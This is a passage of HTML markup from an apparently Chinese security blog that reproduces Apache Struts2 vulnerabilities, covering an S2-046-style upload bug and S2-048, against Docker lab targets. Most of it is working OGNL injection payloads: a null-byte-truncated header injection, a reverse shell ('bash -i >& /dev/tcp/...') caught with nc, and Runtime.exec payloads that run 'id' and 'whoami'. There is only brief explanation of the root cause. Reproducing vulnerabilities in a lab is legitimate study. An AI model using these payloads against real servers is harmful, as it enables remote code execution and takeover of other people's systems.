auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">].</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">addHeader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'X-Test'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">99</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)}</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\x</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">00b</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/38_L5I2ZjVggAZiceobGA5REeS6IywGPQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w3vwfAJ4psgxaicIORBYm77HkArL5I2ZjVggAZiceobGA5REeS6IywGPQ/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里需要进行00截断，进入hex将30改为00</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/39_ytCHPM81LCiaxBhEiatic77HXmTQXQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wUwXViaDl7NOsdiboxbk5BiaNcJkdTjytCHPM81LCiaxBhEiatic77HXmTQXQ/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/40_K9niaeicQKrE02XQQrqVxhCQibIzeQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wgFaicQnqalM2Dvf5L86pF9XcT6E3K9niaeicQKrE02XQQrqVxhCQibIzeQ/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后发包，可以看到X-Test这个地方已经执行了1+99并输出了结果</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/41_Pd5uWbCTpicmlBfquB03AYxExgxMBg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wFpibbnibFoXW4xttjpT6O9AtvvBPd5uWbCTpicmlBfquB03AYxExgxMBg/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">那么这里就可以构造一个poc进行bash反弹，还是要进行00阶段，nc监听端口，发包即可得到反弹shell</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5819607843137254" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/42_t8WdtwVGUhYK9gNicW7BWTKqKqIcbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wtclb004VUtKcmbhJSGG2hKY8ot8WdtwVGUhYK9gNicW7BWTKqKqIcbQ/640?wx_fmt=png'" data-type="png" data-w="1275" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-048</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同事这个 getText() 的 参数输入点，又可以被用户直接进行控制，用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-048的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.46826758147512865" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/43_iaUicKS3h561qme8yibFo8aRicOvLA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wGu6rwg9a2SJdrxETcqZ2QUxFIMDAiaUicKS3h561qme8yibFo8aRicOvLA/640?wx_fmt=png'" data-type="png" data-w="1166" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">http://192.168.1.8:8080/integration/saveGangster.action</code>漏洞页面，尝试运算1+1</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7718277066356228" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/44_7HQlkrXY1ZXYVicvZ9liaIEVsL0zRw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wwLSlv9kKybKUNvSmGDeIdEh0Cp7HQlkrXY1ZXYVicvZ9liaIEVsL0zRw/640?wx_fmt=png'" data-type="png" data-w="859" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到这里得到了运算结果，说明存在漏洞</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7515625" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/45_cYmePr9Odk6qzwqDBNu6qEPaTEDfMA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wWKeiajZiby2ziaPW4lG5bJtyr1ucYmePr9Odk6qzwqDBNu6qEPaTEDfMA/640?wx_fmt=png'" data-type="png" data-w="640" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">那么这里构造一个payload用来输出id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">):((#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.ActionContext.container'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil@class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">q</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'id'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">())).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">q</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3367272727272727" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/46_RzffgLRvsgnch2vJeJeqHiaTn6S0hQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wibNUOmdNrkibmvcd7EibCaGbuYgpRzffgLRvsgnch2vJeJeqHiaTn6S0hQ/640?wx_fmt=png'" data-type="png" data-w="1375" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload输出whoami</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 